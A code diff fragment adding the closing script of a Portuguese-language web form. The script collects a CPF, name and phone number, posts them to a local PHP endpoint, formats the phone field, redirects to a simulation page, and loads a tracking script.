+            const urlAtual = new URLSearchParams(window.location.search);
+            const novaUrl = new URLSearchParams();
+
+            for (const [chave, valor] of urlAtual.entries()) {
+              if (chave !== "nome" && chave !== "numero") {
+                novaUrl.append(chave, valor);
+              }
+            }
+
+            novaUrl.set("cpf", cpfLimpo);
+
+            const queryBase = novaUrl.toString();
+            const nomeEncoded = encodeURIComponent(nomeLimpo);
+            const numeroEncoded = encodeURIComponent(telefoneLimpo);
+
+            const queryFinal = queryBase
+              ? `${queryBase}&nome=${nomeEncoded}&numero=${numeroEncoded}`
+              : `nome=${nomeEncoded}&numero=${numeroEncoded}`;
+
+            window.location.href = `./simulacao?${queryFinal}`;
+          }
+
+          fetch("./salvar_dados.php", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify(dadosParaSalvar),
+          })
+            .then((response) => response.json())
+            .then((data) => {
+              console.log("Resposta do servidor:", data);
+              if (data.status === "error") {
+                console.error("Erro ao salvar dados:", data.message);
+              }
+              redirecionarSimulacao(cpfLimpo, dadosUsuario.nome, telefoneFormatado);
+            })
+            .catch((error) => {
+              console.error("Erro na requisição:", error);
+              redirecionarSimulacao(cpfLimpo, dadosUsuario.nome, telefoneFormatado);
+            });
+        } catch (error) {
+          console.error("Erro ao processar dados:", error);
+          alert("Erro ao processar dados. Por favor, reinicie o processo.");
+          window.location.href = "./index.html";
+        }
+      });
+
+      btnVoltar.addEventListener("click", function () {
+        window.history.back();
+      });
+
+      updateProgress();
+
+      const telefoneInput = document.getElementById("telefoneInput");
+      if (telefoneInput) {
+        telefoneInput.addEventListener("input", function (e) {
+          let value = e.target.value.replace(/\D/g, "");
+          if (value.length > 11) value = value.substring(0, 11);
+
+          if (value.length > 2 && value.length <= 6) {
+            value = `(${value.substring(0, 2)}) ${value.substring(2)}`;
+          } else if (value.length > 6) {
+            value = `(${value.substring(0, 2)}) ${value.substring(
+              2,
+              7
+            )}-${value.substring(7)}`;
+          }
+
+          e.target.value = value;
+        });
+      }
+    });
+  </script>
+
+  <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async defer></script>
+
+</body>
+</html>
